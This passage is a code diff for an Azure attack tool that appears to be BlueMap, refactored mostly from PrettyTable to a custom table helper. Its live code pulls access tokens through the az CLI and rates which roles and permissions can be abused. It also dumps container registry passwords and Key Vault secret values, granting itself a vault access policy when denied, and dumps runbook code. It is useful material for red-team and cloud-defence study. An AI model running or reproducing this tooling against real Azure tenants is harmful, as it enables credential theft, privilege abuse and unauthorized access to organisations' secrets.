+    if addSecretPwd['status_code'] == 200:
+        pwdOwn = addSecretPwd['json']
         return "AppId: " + pwdOwn['keyId'] + "| Pwd: " + pwdOwn['secretText']
     else:
         return "N/A"
@@ -728,10 +652,14 @@ def tryGetToken():
     global accessTokenGraph, accessTokenVault, hasGraphAccess, hasMgmtAccess, hasVaultEnabled
     try:
         accessToken = None
-        add = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://management.azure.com/\""], capture_output=True, text=True)
-        graph = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://graph.microsoft.com/\""], capture_output=True, text=True)
-        vault = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://vault.azure.net\""], capture_output=True, text=True)
-        if 'No subscription found' in add.stderr or graph.stderr:
+        add = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=https://management.azure.com/"], capture_output=True, text=True)
+        graph = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=https://graph.microsoft.com"], capture_output=True, text=True)
+        vault = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=https://vault.azure.net"], capture_output=True, text=True)
+        if 'The term \'az\' is not recognized as the name of a cmd' in add.stderr or graph.stderr:
+            print("No Az Cli model installed. Please install if possible and try again.")
+            print("Use the command to install: Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\AzureCLI.msi")
+            print("Failed generate token.")
+        elif 'No subscription found' in add.stderr or graph.stderr:
             print("No subscriptions were found. You will need to switch to tenant-level access manually: az login --allow-no-subscriptions")
             print("Failed generate token. You may need to login or try manually.")
         elif 'Exception' in add.stderr or graph.stderr:
@@ -754,8 +682,10 @@ def tryGetToken():
             accessToken = jres['accessToken']
             accessTokenGraph = jresgraph['accessToken']
         return accessToken
+    except KeyError:
+        return False
     except:
-        return None
+        return False
 
 
 
@@ -826,7 +756,7 @@ def canPermissionBeAbused(currentPermission):
                          "Microsoft.Authorization/roleAssignments/write",
                          "Microsoft.Authorization/classicAdministrators/write"]
     if currentPermission == "*":
-        return "" + "|" + "That's means to have a Contributor permission on resources."
+        return "" + "|" + "That's means to have a Contributor/Owner permission on resources."
     elif currentPermission in vmPermissions:
         return currentPermission + "|" + "allows execute code on Virtual Machines."
     elif currentPermission in vmAllowDeployPermission:
@@ -857,75 +787,44 @@ def canPermissionBeAbused(currentPermission):
 
 def GetAllRoleAssignmentsUnderSubscription(subscriptionId):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.get(
-        "https://management.azure.com/subscriptions/" + subscriptionId + "/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01",
-        headers=headers)
-    result = r.json()
-    return result
+    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01", Token)
+    return r['json']
 
 def RD_DumpRunBookContent(runbookGUID):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.get(
-        "https://management.azure.com/" + runbookGUID + "/content?api-version=2019-06-01",
-        headers=headers)
-    if r.status_code == 200:
-        result = r.text
+    r = sendGETRequest("https://management.azure.com/" + runbookGUID + "/content?api-version=2019-06-01",Token)
+    if r["status_code"] == 200:
+        result = r["response"]
     else:
         result = None
     return result
 
 def HLP_GetAzVMPublicIP(subscriptionId,resourceGroupName,publicIpAddressName):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.get(
-        "https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Network/publicIPAddresses/"+publicIpAddressName+"PublicIP?api-version=2022-01-01",
-        headers=headers)
-    if r.status_code == 200:
-        if "ipAddress" not in r.json()['properties']:
+    r = sendGETRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Network/publicIPAddresses/"+publicIpAddressName+"PublicIP?api-version=2022-01-01", Token)
+    if r["status_code"] == 200:
+        if "ipAddress" not in r['json']['properties']:
             result = "N/A"
         else:
-            result = r.json()['properties']['ipAddress']
+            result = r['json']['properties']['ipAddress']
     else:
         result = "N/A"
     return result
 
 def GetAllRoleAssignmentsUnderSubscriptionAndResourceGroup(subscriptionId,resourceGroupId):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.get(
-        "https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/"+resourceGroupId+"/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01",
-        headers=headers)
-    result = r.json()
-    return result
+    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/"+resourceGroupId+"/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01", Token)
+    return r['json']
 
 
 def GetAllRoleDefinitionsUnderId(roleId):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.get("https://management.azure.com/" + roleId + "?api-version=2015-07-01", headers=headers)
-    result = r.json()
-    return result
+    r = sendGETRequest("https://management.azure.com/" + roleId + "?api-version=2015-07-01", Token)
+    return r['json']
 
 
 def AboutWindow():
-    print("AzureMap v1.0 Developed By Maor Tal (@th3location)")
+    print("BlueMap Developed By Maor Tal (@th3location)")
 
 
 def getToken():
@@ -933,40 +832,34 @@ def getToken():
 
 def ListSubscriptionsForToken():
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + str(Token)
-    }
-    r = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    result = r.json()
-    return result
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    return r['json']
 
 
 def GetAllResourcesUnderSubscription(subscriptionId, token):
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + token
-    }
-    r = requests.get(
-        "https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10",
-        headers=headers)
-    result = r.json()
-    return result
+    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10", token)
+    return r['json']
 
 def GetAllResourceGroupsUnderSubscription(subscriptionId):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.get(
-        "https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10",
-        headers=headers)
-    result = r.json()
-    return result
+    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10", Token)
+    return r['json']
 
 def attackWindow():
+    banner = '''
+    ######                       #     #               
+#     # #      #    # ###### ##   ##   ##   #####  
+#     # #      #    # #      # # # #  #  #  #    # 
+######  #      #    # #####  #  #  # #    # #    # 
+#     # #      #    # #      #     # ###### #####  
+#     # #      #    # #      #     # #    # #      
+######  ######  ####  ###### #     # #    # #    
+'''
+    '''
+    print(banner)
+    '''
     supportedCommands = [
+        "test",
         "whoami",
         "scopes",
         "get_subs",
@@ -976,10 +869,10 @@ def attackWindow():
         "get_res",
         "sts",
         "subs",
-        "iam full scan",
+        "iam_scan",
         "privs",
         "perms",
-        "show exploits",
+        "exploits",
         "showtoken",
         "deltoken",
         "run",
@@ -1012,8 +905,6 @@ def attackWindow():
         "Contributor/DumpWebAppPublishProfile",
         "GlobalAdministrator/elevateAccess"
     ]
-    readline.set_completer(SimpleCompleter(exploits).complete)
-    readline.parse_and_bind('tab: complete')
     while (True):
         global TargetSubscription
         global TotalTargets
@@ -1031,6 +922,9 @@ def attackWindow():
         else:
             if mode == "whoami":
                 currentProfile()
+            elif mode == "test":
+                x = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+                print(dict(x['headers'])['Content-Type'])
             elif mode == "scopes":
                 currentScope()
             elif mode == "get_subs" or mode == "subs":
@@ -1038,18 +932,19 @@ def attackWindow():
                 if listSubs.get('value') == None:
                     print("Error occured. Result: " + str(listSubs['error']['message']))
                 else:
-                    subRecords = PrettyTable()
-                    subRecords.align = "l"
-                    subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
+                    field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
+                    rows = []
                     subRecordCount = 0
                     for subRecord in listSubs['value']:
-                        subRecords.add_row(
-                            [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
-                             subRecord['subscriptionPolicies']['quotaId'],
-                             subRecord['subscriptionPolicies']['spendingLimit']])
+                        rows.append(
+                            {"#": subRecordCount, "SubscriptionId": subRecord['subscriptionId'],
+                             "displayName": subRecord['displayName'], "State": subRecord['state'],
+                             "Plan": subRecord['subscriptionPolicies']['quotaId'],
+                             "spendingLimit": subRecord['subscriptionPolicies']['spendingLimit']}
+                        )
                         subRecordCount += 1
                         TotalTargets.append(subRecord['subscriptionId'])
-                    print(subRecords)
+                    print(make_table(field_names, rows))
             elif "set_target" in mode or "sts" in mode:
                 argSub = mode.split(" ")
                 if len(argSub) < 2:
@@ -1062,33 +957,44 @@ def attackWindow():
                         TargetSubscription = argSub[1]
             elif "get_target" in mode:
                 print("Current Target SubscriptionId = " + str(TargetSubscription))
-            elif "iam full scan" in mode:
+            elif "iam_scan" in mode:
                 if TargetSubscription == None:
                     print("Use set_target to set a subscription to work on.")
                 else:
                     print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
                     allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-                    allRolesAssignsRecords = PrettyTable()
-                    allRolesAssignsRecords.align = "l"
+                    field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
+                    rows = []
                     allRolesAssignsRecordsCount = 0
-                    allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
                     for role in range(0, len(allRolesAssigns)):
                         resultAllRolesAssigns = allRolesAssigns
-                        currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
+                        currentRoleInformation = GetAllRoleDefinitionsUnderId(
+                            resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                         currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
                         currentRoleName = currentRoleInformation['properties']['roleName']
-                        allRolesAssignsRecordsCount += 1
                         if canRoleBeAbused(currentRoleName) is not False:
-                            allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
+                            rows.append(
+                                {"#": allRolesAssignsRecordsCount,
+                                 "RoleName": currentRoleName,
+                                 "Scope": currentRoleScope,
+                                 "Can Abused?": "Yes",
+                                 "Details": canRoleBeAbused(currentRoleName).split("|")[1]}
+                            )
                         else:
-                            allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
-                    print(allRolesAssignsRecords)
+                            rows.append(
+                                {"#": allRolesAssignsRecordsCount,
+                                 "RoleName": currentRoleName,
+                                 "Scope": currentRoleScope,
+                                 "Can Abused?": "No",
+                                 "Details": "N/A"}
+                            )
+                        allRolesAssignsRecordsCount += 1
+                    print(make_table(field_names, rows))
                     print("\nChecking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
                     allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-                    allPermRolesAssignsRecords = PrettyTable()
-                    allPermRolesAssignsRecords.align = "l"
+                    field_names2 = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
+                    rows2 = []
                     allPermRolesAssignsRecordsCount = 0
-                    allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
                     for rolePermission in range(0, len(allPermRolesAssigns)):
                         resultAllRolesAssigns = allPermRolesAssigns
                         currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
@@ -1096,57 +1002,82 @@ def attackWindow():
                         currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                         currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                         for permission in currentRolePermissions:
-                            allPermRolesAssignsRecordsCount += 1
                             if canPermissionBeAbused(permission) is not False:
-                                allPermRolesAssignsRecords.add_row(
-                                    [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
+                                rows2.append(
+                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
+                                     "Permission Assigned": permission, "Can Abused?": "Yes",
+                                     "Details": canPermissionBeAbused(permission).split("|")[1]}
+                                )
                             else:
-                                allPermRolesAssignsRecords.add_row(
-                                    [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
-                    print(allPermRolesAssignsRecords)
+                                rows2.append(
+                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
+                                     "Permission Assigned": permission, "Can Abused?": "No",
+                                     "Details": "N/A"}
+                                )
+                            allPermRolesAssignsRecordsCount += 1
+                    print(make_table(field_names2, rows2))
             elif "privs" in mode:
                 if TargetSubscription == None:
                     print("Use set_target to set a subscription to work on.")
                 else:
                     print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
                     allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-                    allRolesAssignsRecords = PrettyTable()
-                    allRolesAssignsRecords.align = "l"
+                    field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
+                    rows = []
                     allRolesAssignsRecordsCount = 0
-                    allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
                     for role in range(0, len(allRolesAssigns)):
                         resultAllRolesAssigns = allRolesAssigns
                         currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                         currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
                         currentRoleName = currentRoleInformation['properties']['roleName']
-                        allRolesAssignsRecordsCount += 1
                         if canRoleBeAbused(currentRoleName) is not False:
-                            allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
+                            rows.append(
+                                {"#": allRolesAssignsRecordsCount,
+                                 "RoleName": currentRoleName,
+                                 "Scope": currentRoleScope,
+                                 "Can Abused?": "Yes",
+                                 "Details": canRoleBeAbused(currentRoleName).split("|")[1]}
+                            )
                         else:
-                            allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
-                    print(allRolesAssignsRecords)
+                            rows.append(
+                                {"#": allRolesAssignsRecordsCount,
+                                 "RoleName": currentRoleName,
+                                 "Scope": currentRoleScope,
+                                 "Can Abused?": "No",
+                                 "Details": "N/A"}
+                            )
+                        allRolesAssignsRecordsCount += 1
+                    print(make_table(field_names, rows))
             elif "perms" in mode:
                 if TargetSubscription == None:
                     print("Use set_target to set a subscription to work on.")
                 else:
                     print("Checking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
                     allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-                    allPermRolesAssignsRecords = PrettyTable()
-                    allPermRolesAssignsRecords.align = "l"
+                    field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
+                    rows = []
                     allPermRolesAssignsRecordsCount = 0
-                    allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
                     for rolePermission in range(0, len(allPermRolesAssigns)):
                         resultAllRolesAssigns = allPermRolesAssigns
-                        currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
+                        currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
+                        resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
                         currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                         currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                         for permission in currentRolePermissions:
-                            allPermRolesAssignsRecordsCount += 1
                             if canPermissionBeAbused(permission) is not False:
-                                allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
+                                rows.append(
+                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
+                                     "Permission Assigned": permission, "Can Abused?": "Yes",
+                                     "Details": canPermissionBeAbused(permission).split("|")[1]}
+                                )
                             else:
-                                allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
-                    print(allPermRolesAssignsRecords)
+                                rows.append(
+                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
+                                     "Permission Assigned": permission, "Can Abused?": "No",
+                                     "Details": "N/A"}
+                                )
+                            allPermRolesAssignsRecordsCount += 1
+                    print(make_table(field_names, rows))
             elif "get_resources" in mode or "get_res" in mode:
                 if TargetSubscription == None:
                     print("Please set target subscription.")
@@ -1154,23 +1085,27 @@ def attackWindow():
                     print("Listing resources under SubscriptionId = " + str(TargetSubscription) + "...")
                     resultResources = GetAllResourcesUnderSubscription(str(TargetSubscription), Token)
                     resultsInternalRes = resultResources['value']
-                    subResRecords = PrettyTable()
-                    subResRecords.align = "l"
+                    field_names = ["#", "Resource Name", "Type", "Location"]
+                    rows = []
                     subResRecordCount = 0
-                    subResRecords.field_names = ["#", "Resource Name", "Type", "Location"]
                     for objRes in range(0, len(resultsInternalRes)):
                         resultResources = resultsInternalRes
                         subResRecordCount += 1
-                        subResRecords.add_row(
-                            [subResRecordCount, resultResources[objRes]['name'], resultResources[objRes]['type'],
-                             resultResources[objRes]['location']])
-                    print(subResRecords)
-            elif mode == "show exploits":
-                subExploitRecords = PrettyTable()
-                subExploitRecords.align = "l"
-                subExploitRecords.field_names = ["Name", "Disclosure Date", "Rate", "Description"]
-                subExploitRecords.add_row(["GlobalAdministrator/elevateAccess", "04.07.2022", "Good", "Exploits the Global Administrator role to modify privileges to Azure Resources"])
-                print(subExploitRecords)
+                        rows.append(
+                            {"#": subResRecordCount, "Resource Name": resultResources[objRes]['name'],
+                             "Type": resultResources[objRes]['type'], "Location": resultResources[objRes]['location']}
+                        )
+                    print(make_table(field_names, rows))
+            elif mode == "exploits":
+                field_names = ["#", "Name"]
+                rows = []
+                exploitCount = 0
+                for exploit in exploits:
+                    rows.append(
+                        {"#": exploitCount, "Name": exploit}
+                    )
+                    exploitCount += 1
+                print(make_table(field_names, rows))
             elif "use" in mode:
                 argExpSub = mode.replace("use ", "").replace(" ", "")
                 if argExpSub == "use":
@@ -1199,7 +1134,9 @@ def attackWindow():
                 setToken("")
             elif "Token/GenToken" in ExploitChoosen and mode == "run":
                 print("Trying getting token automatically for you...")
-                initToken(tryGetToken(), False)
+                token = tryGetToken()
+                if token:
+                    initToken(token, False)
             elif "Token/SetToken" in ExploitChoosen and mode == "run":
                 print("Please paste your Azure token here:")
                 token = input("Enter Token:")
@@ -1210,60 +1147,75 @@ def attackWindow():
                 if len(RD_ListExposedWebApps()) < 1:
                     print("No Azure Service Apps were found.")
                 else:
-                    AppServiceRecords = PrettyTable()
-                    AppServiceRecords.align = "l"
-                    AppServiceRecords.field_names = ["#", "App Name", "Type", "Status", "Enabled Hostname(s)","Identity"]
+                    field_names = ["#", "App Name", "Type", "Status", "Enabled Hostname(s)","Identity"]
+                    rows = []
                     AppServiceRecordsCount = 0
                     for AppServiceRecord in RD_ListExposedWebApps():
                         if AppServiceRecord['identity'] == "N/A":
                             AppIdentity = "N/A"
                         else:
                             AppIdentity = AppServiceRecord['identity']['type']
-                        AppServiceRecords.add_row([AppServiceRecordsCount, AppServiceRecord['name'], AppServiceRecord['kind'], AppServiceRecord['properties']['state'], "\n".join(AppServiceRecord['properties']['enabledHostNames']), AppIdentity])
+                        rows.append(
+                            {"#": AppServiceRecordsCount, "App Name": AppServiceRecord['name'],
+                             "Type": AppServiceRecord['kind'], "Status": AppServiceRecord['properties']['state'],
+                             "Enabled Hostname(s)": str(AppServiceRecord['properties']['enabledHostNames']),
+                             "Identity": AppIdentity}
+                        )
                         AppServiceRecordsCount += 1
-                    print(AppServiceRecords)
+                    print(make_table(field_names, rows))
             elif "Reader/ListAllAzureContainerRegistry" in ExploitChoosen and mode == "run":
                 print("Trying to list all ACR (Azure Container Registry) available in all subscriptions..")
                 if len(RD_ListAllACRs()['value']) < 1:
                     print("No Azure Container Registry were found.")
                 else:
-                    ACRRecords = PrettyTable()
-                    ACRRecords.align = "l"
-                    ACRRecords.field_names = ["#", "Registry Name", "Location", "Login Server", "AdminEnabled", "CreatedAt"]
+                    field_names = ["#", "Registry Name", "Location", "Login Server", "AdminEnabled", "CreatedAt"]
+                    rows = []
                     ACRRecordsCount = 0
                     for ACRRecord in RD_ListAllACRs()['value']:
-                        ACRRecords.add_row([ACRRecordsCount, ACRRecord['name'], ACRRecord['location'], ACRRecord['properties']['loginServer'], ACRRecord['properties']['adminUserEnabled'], ACRRecord['properties']['loginServer']])
+                        rows.append(
+                            {"#": ACRRecordsCount, "Registry Name": ACRRecord['name'],
+                             "Location": ACRRecord['location'], "Login Server": ACRRecord['properties']['loginServer'],
+                             "AdminEnabled": ACRRecord['properties']['adminUserEnabled'],
+                             "CreatedAt": ACRRecord['properties']['loginServer']}
+                        )
                         ACRRecordsCount += 1
-                    print(ACRRecords)
+                    print(make_table(field_names, rows))
             elif "Contributor/ListACRCredentials" in ExploitChoosen and mode == "run":
                 print("Trying to list all users and passwords for ACR (Azure Container Registry)..")
-                ACRCredsRecords = PrettyTable()
-                ACRCredsRecords.align = "l"
-                ACRCredsRecords.field_names = ["#", "Registry Name", "UserName", "Password(s)"]
-                ACRCredsRecordsCount = 0
                 if len(RD_ListAllACRs()['value']) < 1:
                     print("No Azure Container Registry were found.")
                 else:
+                    field_names = ["#", "Registry Name", "UserName", "Password(s)"]
+                    rows = []
+                    ACRRecordsCount = 0
                     for ACRRecord in RD_ListAllACRs()['value']:
                         InfoACR = HLP_GetACRCreds(ACRRecord['id'])
-                        ACRCredsRecords.add_row([ACRCredsRecordsCount, ACRRecord['name'], InfoACR["username"], InfoACR["passwords"]])
-                        ACRCredsRecordsCount += 1
-                    print(ACRCredsRecords)
+                        rows.append(
+                            {"#": ACRRecordsCount, "Registry Name": ACRRecord['name'],
+                             "UserName": InfoACR["username"],
+                             "Password(s)": str(InfoACR["passwords"])
+                             }
+                        )
+                        ACRRecordsCount += 1
+                    print(make_table(field_names, rows))
             elif "Reader/ListAutomationAccounts" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate all automation accounts..")
                 if len(RD_ListAutomationAccounts()) < 1:
                     print("No Automation accounts were found.")
                 else:
-                    AutomationAccountRecords = PrettyTable()
-                    AutomationAccountRecords.align = "l"
-                    AutomationAccountRecords.field_names = ["#", "SubscriptionId", "AccountName", "Location", "Tags"]
+                    field_names = ["#", "SubscriptionId", "AccountName", "Location", "Tags"]
+                    rows = []
                     AutomationAccountRecordsCount = 0
                     for AutomationAccRecord in RD_ListAutomationAccounts():
-                        AutomationAccountRecords.add_row(
-                            [AutomationAccountRecordsCount, AutomationAccRecord['subscriptionId'], AutomationAccRecord['name'], AutomationAccRecord['location'],
-                             str(AutomationAccRecord['tags'])])
+                        rows.append(
+                            {"#": AutomationAccountRecordsCount, "SubscriptionId": AutomationAccRecord['subscriptionId'],
+                             "AccountName": AutomationAccRecord["name"],
+                             "Location": AutomationAccRecord["location"],
+                             "Tags": str(AutomationAccRecord['tags']),
+                             }
+                        )
                         AutomationAccountRecordsCount += 1
-                    print(AutomationAccountRecords)
+                    print(make_table(field_names, rows))
             elif "Contributor/ReadVaultSecret" in ExploitChoosen and mode == "run":
                 if not hasVaultEnabled:
                     print("ERROR: No Vault Scope Enabled.")
@@ -1272,25 +1224,27 @@ def attackWindow():
                         print("No Vaults were found.")
                     else:
                         print("Trying to list all vaults.. (it might take a few minutes)")
+                        field_names = ["#", "Name", "Location", "Type", "Resource Group", "SubscriptionId"]
+                        rows = []
                         victims = []
-                        AllVaultsRecords = PrettyTable()
-                        AllVaultsRecords.align = "l"
-                        AllVaultsRecords.field_names = ["#", "Name", "Location", "Type", "Resource Group", "SubscriptionId"]
-                        AllVaultRecordsCount = 0
+                        vaultRecordCount = 0
                         for VaultRecord in RD_ListAllVaults():
-                            victims.append({"name": VaultRecord['name'], "id":  VaultRecord['id']})
-                            AllVaultsRecords.add_row(
-                                [AllVaultRecordsCount, VaultRecord['name'], VaultRecord['location'], VaultRecord['type'],
-                                 VaultRecord['resourceGroup'], VaultRecord['subscriptionId']])
-                            AllVaultRecordsCount += 1
-                        print(AllVaultsRecords)
+                            victims.append({"name": VaultRecord['name'], "id": VaultRecord['id']})
+                            rows.append(
+                                {"#": vaultRecordCount, "Name": VaultRecord['name'],
+                                 "Location": VaultRecord['location'], "Type": VaultRecord['type'],
+                                 "Resource Group": VaultRecord['resourceGroup'],
+                                 "SubscriptionId": VaultRecord['subscriptionId']}
+                            )
+                            vaultRecordCount += 1
+                        print(make_table(field_names, rows))
                         TargetVault = input("Select Vault Id [i.e. 0]: ")
                         Selection = int(TargetVault)
                         secretsLoad = HLP_GetSecretsInVault(victims[Selection]['name']).split("|")
-                        AllVaultsSecretsRecords = PrettyTable()
-                        AllVaultsSecretsRecords.align = "l"
-                        AllVaultsSecretsRecords.field_names = ["#", "Secret Name", "Secret Value"]
-                        AllVaultsSecretsRecordsCount = 0
+
+                        field_names2 = ["#", "Secret Name", "Secret Value"]
+                        rows2 = []
+                        vaultSecretRecordCount = 0
                         SecretPathPattren = "https://"+str(victims[Selection]['name'])+".vault.azure.net/secrets/"
                         print("Trying enumerate all "+str(victims[Selection]['name'])+" vault secrets.. ")
                         if 'does not have secrets list permission on key vault' in secretsLoad[1]:
@@ -1298,16 +1252,22 @@ def attackWindow():
                             if HLP_AddVaultACL(victims[Selection]['id']):
                                 secretsLoadAgain = HLP_GetSecretsInVaultNoStrings(victims[Selection]['name'])
                                 for secret in secretsLoadAgain:
-                                    AllVaultsSecretsRecords.add_row([AllVaultsSecretsRecordsCount, secret['id'].replace(SecretPathPattren,""), HLP_GetSecretValueTXT(secret['id'])])
-                                    AllVaultsSecretsRecordsCount +=1
+                                    rows2.append(
+                                        {"#": vaultSecretRecordCount, "Secret Name": secret['id'].replace(SecretPathPattren,""),
+                                        "Secret Value": HLP_GetSecretValueTXT(secret['id'])}
+                                    )
+                                    vaultSecretRecordCount += 1
                             else:
                                 print("Failed to create access policy for vault.")
                         else:
                             secretsLoadClean = HLP_GetSecretsInVaultNoStrings(victims[Selection]['name'])
                             for secret in secretsLoadClean:
-                                AllVaultsSecretsRecords.add_row([AllVaultsSecretsRecordsCount, secret['id'].replace(SecretPathPattren,""), HLP_GetSecretValueTXT(secret['id'])])
-                                AllVaultsSecretsRecordsCount += 1
-                        print(AllVaultsSecretsRecords)
+                                rows2.append(
+                                    {"#": vaultSecretRecordCount, "Secret Name": secret['id'].replace(SecretPathPattren, ""),
+                                     "Secret Value": HLP_GetSecretValueTXT(secret['id'])}
+                                )
+                                vaultSecretRecordCount += 1
+                        print(make_table(field_names2, rows2))
             elif "Reader/DumpAllRunBooks" in ExploitChoosen and mode == "run":
                 print("Trying to dump runbooks codes under available automation accounts (it may takes a few minutes)..")
                 print("Keep in mind that it might be noisy opsec..")
@@ -1328,81 +1288,117 @@ def attackWindow():
                     print("No Runbooks were found.")
                 else:
                     print("Trying to enumerate all runbooks under available automation accounts..")
-                    RunBooksRecords = PrettyTable()
-                    RunBooksRecords.align = "l"
-                    RunBooksRecords.field_names = ["#", "SubscriptionId", "AutomationAccount", "Runbook Name", "Runbook Type", "Status", "CreatedAt", "UpdatedAt"]
-                    RunBooksRecordsCount = 0
+                    field_names = ["#", "SubscriptionId", "AutomationAccount", "Runbook Name", "Runbook Type", "Status", "CreatedAt", "UpdatedAt"]
+                    rows = []
+                    AutomationAccountRecordsCount = 0
                     for RunBookRecord in RD_ListRunBooksByAutomationAccounts():
-                        RunBooksRecords.add_row([RunBooksRecordsCount, RunBookRecord['subscriptionId'], RunBookRecord['automationAccount'], RunBookRecord['name'], RunBookRecord['properties']['runbookType'], RunBookRecord['properties']['state'], RunBookRecord['properties']['creationTime'], RunBookRecord['properties']['lastModifiedTime']])
-                        RunBooksRecordsCount += 1
-                    print(RunBooksRecords)
+                        rows.append(
+                            {"#": AutomationAccountRecordsCount,
+                             "SubscriptionId": RunBookRecord['subscriptionId'],
+                             "AutomationAccount": RunBookRecord["automationAccount"],
+                             "Runbook Name": RunBookRecord["name"],
+                             "Runbook Type": RunBookRecord['properties']['runbookType'],
+                             "Status": RunBookRecord['properties']['state'],
+                             "CreatedAt": RunBookRecord['properties']['creationTime'],
+                             "UpdatedAt": RunBookRecord['properties']['lastModifiedTime'],
+                             }
+                        )
+                        AutomationAccountRecordsCount += 1
+                    print(make_table(field_names, rows))
             elif "Reader/ARMTemplatesDisclosure" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate outputs and parameters strings from a Azure Resource Manager (ARM)..")
                 if len(RD_ListARMTemplates()) < 1:
                     print("No ARM Templates were found.")
                 else:
-                    ArmTempRecords = PrettyTable()
-                    ArmTempRecords.align = "l"
